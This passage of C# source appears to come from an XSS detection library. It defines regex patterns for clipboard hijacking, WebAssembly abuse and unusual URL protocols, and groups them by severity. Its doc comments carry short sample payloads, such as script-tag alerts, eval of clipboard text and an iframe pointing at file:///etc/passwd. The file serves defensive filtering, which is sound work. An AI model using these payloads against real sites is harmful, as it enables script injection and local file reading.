        public static readonly Regex ExecCommandPaste = new(
            @"document\.execCommand\s*\(\s*[""']?\s*paste",
            RegexOptions.IgnoreCase | RegexOptions.Compiled,
            RegexTimeout);

        /// <summary>
        /// Detects navigator.clipboard.writeText with potentially malicious content.
        /// Example: navigator.clipboard.writeText('&lt;script&gt;alert(1)&lt;/script&gt;')
        /// </summary>
        public static readonly Regex ClipboardWriteTextMalicious = new(
            @"navigator\.clipboard\.writeText\s*\([^)]*<script",
            RegexOptions.IgnoreCase | RegexOptions.Compiled,
            RegexTimeout);

        /// <summary>
        /// Detects clipboard hijacking patterns (copy event listener with modification).
        /// Example: document.addEventListener('copy', function(e){ e.clipboardData.setData('text/html', '&lt;script&gt;...') })
        /// </summary>
        public static readonly Regex ClipboardHijacking = new(
            @"addEventListener\s*\(\s*[""']?\s*copy.*?clipboardData\.setData.*?<script",
            RegexOptions.IgnoreCase | RegexOptions.Compiled | RegexOptions.Singleline,
            RegexTimeout);

        /// <summary>
        /// Detects clipboard read operations that might be exploited.
        /// Example: navigator.clipboard.readText().then(text => eval(text))
        /// </summary>
        public static readonly Regex ClipboardReadExploit = new(
            @"navigator\.clipboard\.read(?:Text)?\s*\([^)]*\).*?(?:eval|Function)\s*\(",
            RegexOptions.IgnoreCase | RegexOptions.Compiled | RegexOptions.Singleline,
            RegexTimeout);
    }

    /// <summary>
    /// WebAssembly XSS patterns.
    /// </summary>
    public static class WebAssembly
    {
        /// <summary>
        /// Detects WebAssembly module instantiation with malicious imports.
        /// Example: WebAssembly.instantiate(module, {js: {eval: eval}})
        /// </summary>
        public static readonly Regex WasmInstantiateMalicious = new(
            @"WebAssembly\.instantiate\s*\([^)]*(?:eval|Function|document\.cookie)",
            RegexOptions.IgnoreCase | RegexOptions.Compiled,
            RegexTimeout);

        /// <summary>
        /// Detects WebAssembly.compileStreaming with suspicious sources.
        /// Example: WebAssembly.compileStreaming(fetch('data:application/wasm,...'))
        /// </summary>
        public static readonly Regex WasmCompileStreamingSuspicious = new(
            @"WebAssembly\.compileStreaming\s*\([^)]*(?:data:|javascript:)",
            RegexOptions.IgnoreCase | RegexOptions.Compiled,
            RegexTimeout);

        /// <summary>
        /// Detects WASM import object with dangerous JavaScript functions.
        /// Example: const imports = {env: {eval: eval, alert: alert}}
        /// </summary>
        public static readonly Regex WasmImportObjectDangerous = new(
            @"WebAssembly\.\w+\s*\([^,]*,\s*\{[^}]*(?:eval|Function|alert|document\.cookie)",
            RegexOptions.IgnoreCase | RegexOptions.Compiled,
            RegexTimeout);

        /// <summary>
        /// Detects WebAssembly.Module constructor with data: URI.
        /// Example: new WebAssembly.Module(data:...)
        /// </summary>
        public static readonly Regex WasmModuleDataUri = new(
            @"new\s+WebAssembly\.Module\s*\([^)]*data:",
            RegexOptions.IgnoreCase | RegexOptions.Compiled,
            RegexTimeout);
    }

    /// <summary>
    /// Additional protocol handlers beyond javascript: and data:.
    /// </summary>
    public static class ProtocolHandlers
    {
        /// <summary>
        /// Detects mhtml: protocol (IE/Edge specific).
        /// Example: &lt;iframe src="mhtml:http://example.com!malicious"&gt;
        /// </summary>
        public static readonly Regex MhtmlProtocol = new(
            @"mhtml\s*:",
            RegexOptions.IgnoreCase | RegexOptions.Compiled,
            RegexTimeout);

        /// <summary>
        /// Detects ms-its: protocol (IE/Edge specific).
        /// Example: &lt;iframe src="ms-its:mhtml:file://c:\foo.mht!http://example.com"&gt;
        /// </summary>
        public static readonly Regex MsItsProtocol = new(
            @"ms-its\s*:",
            RegexOptions.IgnoreCase | RegexOptions.Compiled,
            RegexTimeout);

        /// <summary>
        /// Detects res: protocol (IE specific resource protocol).
        /// Example: &lt;iframe src="res://mshtml.dll/blank.htm"&gt;
        /// </summary>
        public static readonly Regex ResProtocol = new(
            @"res\s*:",
            RegexOptions.IgnoreCase | RegexOptions.Compiled,
            RegexTimeout);

        /// <summary>
        /// Detects wyciwyg: protocol (Firefox What-You-Cache-Is-What-You-Get).
        /// Example: &lt;iframe src="wyciwyg://0/http://example.com"&gt;
        /// </summary>
        public static readonly Regex WyciwygProtocol = new(
            @"wyciwyg\s*:",
            RegexOptions.IgnoreCase | RegexOptions.Compiled,
            RegexTimeout);

        /// <summary>
        /// Detects view-source: protocol.
        /// Example: &lt;iframe src="view-source:http://example.com"&gt;
        /// </summary>
        public static readonly Regex ViewSourceProtocol = new(
            @"view-source\s*:",
            RegexOptions.IgnoreCase | RegexOptions.Compiled,
            RegexTimeout);

        /// <summary>
        /// Detects file: protocol which can access local files.
        /// Example: &lt;iframe src="file:///etc/passwd"&gt;
        /// </summary>
        public static readonly Regex FileProtocol = new(
            @"file\s*:",
            RegexOptions.IgnoreCase | RegexOptions.Compiled,
            RegexTimeout);

        /// <summary>
        /// Detects blob: protocol URLs that might contain malicious content.
        /// Example: &lt;iframe src="blob:http://example.com/uuid"&gt;
        /// </summary>
        public static readonly Regex BlobProtocol = new(
            @"blob\s*:",
            RegexOptions.IgnoreCase | RegexOptions.Compiled,
            RegexTimeout);
    }

    /// <summary>
    /// Gets all critical severity patterns that should be checked first.
    /// </summary>
    public static IEnumerable<Regex> GetCriticalPatterns()
    {
        yield return Critical.ScriptTag;
        yield return Critical.InlineEventHandlers;
        yield return Critical.JavaScriptProtocol;
        yield return Critical.VbScriptProtocol;
        yield return Critical.DangerousScriptContent;
        yield return Critical.Base64EncodedScript;
        yield return Critical.CssExpression;

        // Template injection (can lead to RCE-like scenarios)
        yield return TemplateInjection.AngularConstructorInjection;
        yield return TemplateInjection.VueInternalPropertyInjection;
        yield return TemplateInjection.TemplateDangerousCode;
    }

    /// <summary>
    /// Gets all high severity patterns (SVG, Image, IFrame attacks, Workers, WebAssembly).
    /// </summary>
    public static IEnumerable<Regex> GetHighSeverityPatterns()
    {
        // SVG patterns
        yield return Svg.SvgOnLoad;
        yield return Svg.SvgScript;
        yield return Svg.SvgAnimate;
        yield return Svg.SvgForeignObject;
        yield return Svg.MathMLScript;

        // Image patterns
        yield return Image.ImageOnError;
        yield return Image.ImageOnLoad;
        yield return Image.ImageJavaScriptSrc;
        yield return Image.ImageDataUri;

        // IFrame patterns
        yield return IFrame.IFrameJavaScriptSrc;
        yield return IFrame.IFrameDataUri;
        yield return IFrame.IFrameSrcDocWithScript;

        // Worker patterns (can execute arbitrary code)
        yield return Workers.WorkerDataUri;
        yield return Workers.SharedWorkerJavaScript;
        yield return Workers.ServiceWorkerRegister;
        yield return Workers.ImportScriptsSuspicious;
        yield return Workers.WorkerBlobUrl;

        // WebAssembly patterns (can execute arbitrary code)
        yield return WebAssembly.WasmInstantiateMalicious;
        yield return WebAssembly.WasmCompileStreamingSuspicious;
        yield return WebAssembly.WasmImportObjectDangerous;
        yield return WebAssembly.WasmModuleDataUri;

        // Shadow DOM patterns
        yield return ShadowDom.TemplateWithScript;
        yield return ShadowDom.CustomElementMalicious;
        yield return ShadowDom.AttachShadowMalicious;
    }

    /// <summary>
    /// Gets all medium severity patterns (Form, Data URI, Meta, Link, CSS, Module, Protocol attacks).
    /// </summary>
    public static IEnumerable<Regex> GetMediumSeverityPatterns()
    {
        // Form patterns
        yield return Form.FormJavaScriptAction;
        yield return Form.FormDataUriAction;
        yield return Form.FormActionAttribute;

        // Data URI patterns
        yield return DataUri.HtmlDataUriWithScript;
        yield return DataUri.Base64HtmlDataUri;
        yield return DataUri.SvgDataUri;

        // Meta patterns
        yield return Meta.MetaRefreshJavaScript;
        yield return Meta.MetaRefreshDataUri;

        // Link patterns
        yield return Link.BaseJavaScript;
        yield return Link.BaseDataUri;
        yield return Link.LinkJavaScriptHref;
        yield return Link.LinkDataUri;
        yield return Link.LinkImport;

        // Object/Embed patterns
        yield return ObjectEmbed.ObjectDataUri;
        yield return ObjectEmbed.EmbedSuspiciousSrc;

        // CSS Injection patterns
        yield return CssInjection.CssImportJavaScript;
        yield return CssInjection.MozBindingAttack;
        yield return CssInjection.CssUrlProtocolAttack;
        yield return CssInjection.CssBehaviorProperty;
        yield return CssInjection.CssKeyframesWithEvents;
        yield return CssInjection.CssImportDataUri;

        // Module injection patterns
        yield return ModuleInjection.ImportMapSuspicious;
        yield return ModuleInjection.DynamicImportSuspicious;
        yield return ModuleInjection.ImportMetaManipulation;
        yield return ModuleInjection.ModuleScriptDangerous;

        // Web protocols patterns
        yield return WebProtocols.WebSocketJavaScriptProtocol;
        yield return WebProtocols.EventSourceSuspicious;
        yield return WebProtocols.ServerSentEventsMalicious;
        yield return WebProtocols.WebSocketDataProtocol;

        // Additional protocol handlers
        yield return ProtocolHandlers.MhtmlProtocol;
        yield return ProtocolHandlers.MsItsProtocol;
        yield return ProtocolHandlers.ResProtocol;
        yield return ProtocolHandlers.WyciwygProtocol;
        yield return ProtocolHandlers.ViewSourceProtocol;
        yield return ProtocolHandlers.FileProtocol;
        yield return ProtocolHandlers.BlobProtocol;

        // Template injection (less critical patterns)
        yield return TemplateInjection.ReactDangerousHtml;
        yield return TemplateInjection.HandlebarsTripleStash;
        yield return TemplateInjection.MustacheUnescaped;
    }

    /// <summary>
    /// Gets all advanced attack patterns (DOM clobbering, mXSS, encoding attacks, clipboard).
    /// </summary>
    public static IEnumerable<Regex> GetAdvancedPatterns()
    {
        // DOM Clobbering
        yield return DomClobbering.SuspiciousIdAttributes;
        yield return DomClobbering.SuspiciousNameAttributes;
        yield return DomClobbering.DuplicateIdName;

        // Mutation XSS - Basic patterns
        yield return MutationXss.BackticksInAttributes;
        yield return MutationXss.EncodedJavaScriptProtocol;
        yield return MutationXss.NamespaceConfusion;
        yield return MutationXss.MalformedTags;

        // Mutation XSS - Encoding detection
        yield return MutationXss.UnicodeEscapeSequences;
        yield return MutationXss.HexEscapeSequences;
        yield return MutationXss.OctalEscapeSequences;
        yield return MutationXss.MixedEncodingAttack;
        yield return MutationXss.DoubleUrlEncoding;
        yield return MutationXss.MultipleUrlEncoding;
        yield return MutationXss.Utf7EncodedAttack;
        yield return MutationXss.NullByteInjection;

        // Shadow DOM patterns
        yield return ShadowDom.SlotInjection;

        // Clipboard API patterns
        yield return ClipboardApi.ExecCommandPaste;
        yield return ClipboardApi.ClipboardWriteTextMalicious;
        yield return ClipboardApi.ClipboardHijacking;
        yield return ClipboardApi.ClipboardReadExploit;
    }

    /// <summary>
    /// Gets all patterns in optimal detection order (critical first).
    /// </summary>
    public static IEnumerable<Regex> GetAllPatternsOrdered()
    {
        foreach (var pattern in GetCriticalPatterns())
            yield return pattern;

        foreach (var pattern in GetHighSeverityPatterns())
            yield return pattern;

        foreach (var pattern in GetMediumSeverityPatterns())
            yield return pattern;

        foreach (var pattern in GetAdvancedPatterns())
            yield return pattern;
    }
}
